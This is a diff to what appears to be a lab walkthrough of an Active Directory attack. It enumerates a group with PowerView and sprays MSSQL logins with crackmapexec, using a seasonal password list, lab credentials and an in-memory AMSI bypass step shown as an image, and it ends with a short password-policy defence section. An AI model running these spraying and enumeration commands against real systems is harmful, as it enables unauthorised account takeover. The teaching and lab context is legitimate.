@@ -30,36 +30,49 @@ A old habit what a lot of companies enforce is the requirement to change passwor
 
 ### Tools
 
+* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 * [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)
-* [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
 
 ### Executing the attack
 
 1. So during the enumeration we discovered that there are three domain users/groups which are `AMSTERDAM\richard`,  `BANK\administrator` and `AMSTERDAM\DatabaseUsers`.&#x20;
-2. To check this, login to `WS01` as `Richard` with the password `Sample123`.
-3. If we check these out we can see that `AMSTERDAM\DatabaseUsers` isn't a user but a group. With the help of powerview we can query the group members:
+2. To check which of these are users and groups, login to `WS01` as `Richard` with the password `Sample123`.
+3. Download PowerView on the kali machine and host it on a webserver:
 
 ```
-// Some code
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+python3 -m http.server 8090
 ```
 
-2\. We already sprayed passwords at the SQL server during the initial access steps. We will do it again here. First we need to make a list of the enumerated logins in `users.txt`:
+4\. Start PowerShell and download and execute an amsi and PowerView in memory:
+
+![](<../../../../../.gitbook/assets/image (7).png>)
+
+5\. Now we can query these objects using PowerView and the `Get-DomainObject` cmdlet. We already know who Richard is and the Administrator is a well known user. We will query DatabaseUsers:
 
 ```
-# domainusers.txt
-AMSTERDAM\richard
-BANK\administrator
-AMSTERDAM\DatabaseUsers
+Get-DomainObject DatabaseUsers
+```
 
+![](<../../../../../.gitbook/assets/image (52).png>)
+
+6\. The output shows us that the `DatabasUsers` is a group object and that `bob` is its only member.
+
+7\. We already sprayed passwords at the SQL server during the initial access steps. We will do it again here. First we need to make a list of the enumerated logins in users.txt:
+
+```
 # sqlusers.txt
 Developer
 Developer_test
 testadmin
 bob
 SQLAdmin
+
+# domainusers.txt
+bob
 ```
 
-2\. Secondly create a `passwords.txt` file and copy the following passwords like we did during the password spraying attack for normal domain users and we will also add the usernames since sometimes admin set the username as the password:
+8\. Secondly create a `passwords.txt` file and copy the following passwords like we did during the password spraying attack for normal domain users and we will also add the usernames since sometimes admin set the username as the password:
 
 ```
 Spring2022!
@@ -77,17 +90,45 @@ Developer
 Developer_test
 ```
 
-3\. First we will run crackmapexec to connect to the MSSQL service and spray with local SQL users
+9\. First we will run Crackmapexec to connect to the MSSQL service running on `WEB01` and spray with local SQL users. We have to use the `--local-auth` flag otherwise it will spray under the domain context. We will also use the `--continue-on-success` flag so it doesn't stop after the first successfull hit.
 
 ```
-crackmapexec mssql 10.0.0.5 -u users.txt -p passwords.txt --local-auth
+crackmapexec mssql 10.0.0.5 -u sqlusers.txt -p passwords.txt --local-auth --continue-on-success | grep "+"
 ```
+
+![](<../../../../../.gitbook/assets/image (12).png>)
+
+We found the password for three users and it seems thats `SQLAdmin` has sysadmin rights since it shows `Pwn3d!` , this means it has admin rights. Since we are spraying MSSQL logins this means sysadmin rights. If we were spraying with SMB it meant the user was localadmin on the machine.
+
+10\. We can also run Crackmapexec with the domain context:
+
+```
+crackmapexec mssql 10.0.0.5 -u domainusers.txt -p passwords.txt --continue-on-success | grep "+"
+```
+
+![](<../../../../../.gitbook/assets/image (18).png>)
+
+We discovered the password of another user `bob`, but this time the Domain User. We already connected to the SQL service using both SQL accounts and Domain user accounts. This can be done with tools such as mssql-cli or heidiSQL.&#x20;
+
+11\. Something we didn't show is that its possible to execute sql queries with crackmapexec:
+
+```
+crackmapexec mssql 10.0.0.5 -u SQLAdmin -p Winter2022! --local-auth -q "select @@version"
+```
+
+![](<../../../../../.gitbook/assets/image (36).png>)
+
+There will always be loads of tools which can do the same stuff, it will always come down to convenience and where you are used too or like the most.
 
 ## Defending
 
 ### Recommendations
 
+* Implement a strong password policy:
 
+{% content-ref url="../../../../../defence/hardening/strong-password-policy.md" %}
+[strong-password-policy.md](../../../../../defence/hardening/strong-password-policy.md)
+{% endcontent-ref %}
 
 ### Detection
 
@@ -95,3 +136,6 @@ crackmapexec mssql 10.0.0.5 -u users.txt -p passwords.txt --local-auth
 
 ## References
 
+{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}
+
+{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}
